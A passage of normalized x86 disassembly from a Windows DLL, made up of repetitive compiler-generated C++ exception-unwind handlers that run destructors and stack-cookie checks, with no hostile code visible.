call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e930
lea ecx [ ebp - 0x214 ]
jmp sub_10023120
sub_1004e93b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x220 ]
mov ecx [ edx - 0x224 ]
xor ecx eax
call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e970
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004e97e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e9a0
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
jmp sub_10001f21
sub_1004e9b9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004e9e0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004e9ee
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ea10
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004ea1e
mov edx [ esp + 0x8 ]
lea eax [ edx ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ea40
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004ea4e
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
lea ecx [ ebp - 0x28 ]
jmp sub_10001f21
sub_1004ea67
mov eax [ ebp - 0x2c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffd
mov ecx [ ebp + 0x4 ]
jmp sub_10001f21
sub_1004ea80
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x28 ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eaa0
lea ecx [ ebp - 0x30 ]
jmp sub_10026640
sub_1004eaa8
mov eax [ ebp - 0x38 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x38 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp sub_10001f21
sub_1004eac1
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004eac9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x40 ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_10027150
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eaf1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eb0c
lea ecx [ ebp - 0x10 ]
jmp sub_10021eac
sub_1004eb14
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eb2f
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004eb37
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eb5c
push [ ebp + 0x10 ]
call sub_100272e8
pop ecx
retn
sub_1004eb66
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004eb6e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eb89
lea ecx [ ebp - 0x84 ]
jmp sub_1000794c
sub_1004eb94
lea ecx [ ebp - 0x88 ]
jmp sub_10021eac
sub_1004eb9f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ebc7
lea ecx [ ebp - 0x3c ]
jmp sub_10007dbd
sub_1004ebcf
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ebd7
lea ecx [ ebp - 0x5c ]
jmp sub_10001f21
sub_1004ebdf
lea ecx [ ebp - 0x5c ]
jmp sub_10001f21
sub_1004ebe7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ec0c
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004ec14
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ec1c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ec41
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ec49
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004ec51
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ec76
lea ecx [ ebp - 0x74 ]
jmp sub_10007dbd
sub_1004ec7e
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004ec86
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ec8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ecb3
lea ecx [ ebp - 0x40 ]
jmp sub_10007dbd
sub_1004ecbb
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ecc3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ece8
lea ecx [ ebp - 0x54 ]
jmp sub_10007dbd
sub_1004ecf0
lea ecx [ ebp - 0x4c ]
jmp sub_10001f21
sub_1004ecf8
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ed00
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ed08
lea ecx [ ebp - 0x60 ]
jmp sub_10007dbd
sub_1004ed10
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ed35
lea ecx [ ebp - 0x3c ]
jmp sub_10007dbd
sub_1004ed3d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ed62
lea ecx [ ebp - 0x38 ]
jmp sub_10007dbd
sub_1004ed6a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ed8f
lea ecx [ ebp - 0x58 ]
jmp sub_10007dbd
sub_1004ed97
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004edbc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004edd7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004edf2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ee0d
mov ecx [ ebp - 0x10 ]
jmp sub_1000f26d
sub_1004ee15
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ee30
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ee4b
lea ecx [ ebp - 0x34 ]
jmp sub_10001f21
sub_1004ee53
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ee78
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_10002699
sub_1004ee91
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eeac
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_100430f4
sub_1004eec5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004eee0
push [ ebp + 0x8 ]
call sub_100272e8
pop ecx
retn
sub_1004eeea
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004ef03
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ef21
lea ecx [ ebp - 0x14 ]
jmp sub_10021eac
sub_1004ef29
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ef44
lea ecx [ ebp - 0x3c ]
jmp sub_10007dbd
sub_1004ef4c
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004ef54
lea ecx [ ebp - 0x5c ]
jmp sub_100430f4
sub_1004ef5c
lea ecx [ ebp - 0x5c ]
jmp sub_100430f4
sub_1004ef64
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004ef89
lea ecx [ ebp - 0xb0 ]
jmp sub_10007dbd
sub_1004ef94
lea ecx [ ebp - 0xac ]
jmp sub_10007dbd
sub_1004ef9f
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_1004efa7
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_10002699
sub_1004efc0
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004efcb
lea ecx [ ebp - 0x64 ]
jmp sub_10001f21
sub_1004efd3
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004efdb
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_10002699
sub_1004eff7
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_10002699
sub_1004f013
lea ecx [ ebp - 0x15c ]
jmp sub_10002699
sub_1004f01e
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_10002699
sub_1004f03a
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_10002699
sub_1004f056
lea ecx [ ebp - 0x178 ]
jmp sub_10002699
sub_1004f061
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004f069
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f091
lea ecx [ ebp + 0x24 ]
jmp sub_10002699
sub_1004f099
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004f0a4
lea ecx [ ebp - 0x8c ]
jmp sub_10007dbd
sub_1004f0af
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f0b7
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_1004f0bf
lea ecx [ ebp - 0xc0 ]
jmp sub_10002699
sub_1004f0ca
lea ecx [ ebp - 0xc0 ]
jmp sub_10002699
sub_1004f0d5
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_1004f0dd
lea ecx [ ebp - 0xc0 ]
jmp sub_10002699
sub_1004f0e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f110
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f12b
lea ecx [ ebp - 0x78 ]
jmp sub_10007dbd
sub_1004f133
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f13b
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f143
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f168
lea ecx [ ebp - 0x50 ]
jmp sub_10007dbd
sub_1004f170
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f178
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f19d
lea ecx [ ebp - 0xb0 ]
jmp sub_10007dbd
sub_1004f1a8
lea ecx [ ebp - 0xac ]
jmp sub_10007dbd
sub_1004f1b3
lea ecx [ ebp - 0x48 ]
jmp sub_100430f4
sub_1004f1bb
mov eax [ ebp - 0x70 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_100430f4
sub_1004f1d4
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004f1df
lea ecx [ ebp - 0x64 ]
jmp sub_10001f21
sub_1004f1e7
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f1ef
mov eax [ ebp - 0x70 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffd
lea ecx [ ebp - 0x124 ]
jmp sub_100430f4
sub_1004f20b
mov eax [ ebp - 0x70 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffffb
lea ecx [ ebp - 0xec ]
jmp sub_100430f4
sub_1004f227
lea ecx [ ebp - 0x15c ]
jmp sub_100430f4
sub_1004f232
mov eax [ ebp - 0x70 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x70 ] 0xfffffff7
lea ecx [ ebp - 0x140 ]
jmp sub_100430f4
sub_1004f24e
mov eax [ ebp - 0x70 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x70 ] 0xffffffef
lea ecx [ ebp - 0x108 ]
jmp sub_100430f4
sub_1004f26a
lea ecx [ ebp - 0x178 ]
jmp sub_100430f4
sub_1004f275
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f27d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x17c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f2a5
lea ecx [ ebp + 0x24 ]
jmp sub_100430f4
sub_1004f2ad
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004f2b8
lea ecx [ ebp - 0x8c ]
jmp sub_10007dbd
sub_1004f2c3
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f2cb
lea ecx [ ebp - 0x48 ]
jmp sub_100430f4
sub_1004f2d3
lea ecx [ ebp - 0xc0 ]
jmp sub_100430f4
sub_1004f2de
lea ecx [ ebp - 0xc0 ]
jmp sub_100430f4
sub_1004f2e9
lea ecx [ ebp - 0x64 ]
jmp sub_100430f4
sub_1004f2f1
lea ecx [ ebp - 0xc0 ]
jmp sub_100430f4
sub_1004f2fc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f324
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f33f
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004f347
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f34f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f374
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004f37c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f3a1
lea ecx [ ebp - 0x54 ]
jmp sub_10002699
sub_1004f3a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f3ce
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1004f3d6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f3fb
lea ecx [ ebp - 0x54 ]
jmp sub_10007dbd
sub_1004f403
lea ecx [ ebp - 0x4c ]
jmp sub_100430f4
sub_1004f40b
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f413
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f41b
lea ecx [ ebp - 0x60 ]
jmp sub_10007dbd
sub_1004f423
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f448
lea ecx [ ebp - 0x38 ]
jmp sub_10007dbd
sub_1004f450
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f475
lea ecx [ ebp - 0x40 ]
jmp sub_10007dbd
sub_1004f47d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f4a2
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f4aa
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f4b2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f4d7
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f4df
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f504
lea ecx [ ebp - 0x54 ]
jmp sub_100430f4
sub_1004f50c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f531
lea ecx [ ebp - 0x2c ]
jmp sub_100430f4
sub_1004f539
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f55e
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1004f568
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1004f572
push [ ebp - 0x14 ]
call sub_100272e8
pop ecx
retn
sub_1004f57c
push [ ebp + 0xc ]
call sub_100272e8
pop ecx
retn
sub_1004f586
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f5a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f5bc
lea ecx [ ebp - 0x34 ]
jmp sub_10001f21
sub_1004f5c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f5e9
mov eax [ ebp - 0x1c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1c ] 0xfffffffe
mov ecx [ ebp - 0x20 ]
jmp sub_10001f21
sub_1004f602
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f61d
push [ ebp + 0x8 ]
call sub_100272e8
pop ecx
retn
sub_1004f627
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f640
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
jmp sub_1000794c
sub_1004f65c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f67a
lea ecx [ ebp - 0xb8 ]
jmp sub_10007dbd
sub_1004f685
lea ecx [ ebp - 0xbc ]
jmp sub_10007dbd
sub_1004f690
lea ecx [ ebp - 0x64 ]
jmp sub_10001f21
sub_1004f698
mov eax [ ebp - 0x6c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffe
mov ecx [ ebp - 0x7c ]
jmp sub_10001f21
sub_1004f6b1
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004f6bc
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f6c4
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f6cc
mov eax [ ebp - 0x6c ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffd
lea ecx [ ebp - 0x128 ]
jmp sub_10001f21
sub_1004f6e8
mov eax [ ebp - 0x6c ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffffb
lea ecx [ ebp - 0xf0 ]
jmp sub_10001f21
sub_1004f704
lea ecx [ ebp - 0x160 ]
jmp sub_10001f21
sub_1004f70f
mov eax [ ebp - 0x6c ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x6c ] 0xfffffff7
lea ecx [ ebp - 0x144 ]
jmp sub_10001f21
sub_1004f72b
mov eax [ ebp - 0x6c ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x6c ] 0xffffffef
lea ecx [ ebp - 0x10c ]
jmp sub_10001f21
sub_1004f747
lea ecx [ ebp - 0x17c ]
jmp sub_10001f21
sub_1004f752
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f75a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x180 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f782
lea ecx [ ebp + 0x24 ]
jmp sub_10001f21
sub_1004f78a
lea ecx [ ebp - 0x84 ]
jmp sub_10007dbd
sub_1004f795
lea ecx [ ebp - 0x88 ]
jmp sub_10007dbd
sub_1004f7a0
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f7a8
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f7b0
lea ecx [ ebp - 0xc4 ]
jmp sub_10001f21
sub_1004f7bb
lea ecx [ ebp - 0xc4 ]
jmp sub_10001f21
sub_1004f7c6
lea ecx [ ebp - 0x64 ]
jmp sub_10001f21
sub_1004f7ce
lea ecx [ ebp - 0xc4 ]
jmp sub_10001f21
sub_1004f7d9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f801
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f81c
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f824
lea ecx [ ebp - 0x48 ]
jmp sub_10001f21
sub_1004f82c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x5c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f851
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f859
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f87e
lea ecx [ ebp - 0x54 ]
jmp sub_10001f21
sub_1004f886
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1004f8ab
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_1004f8b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_10027150
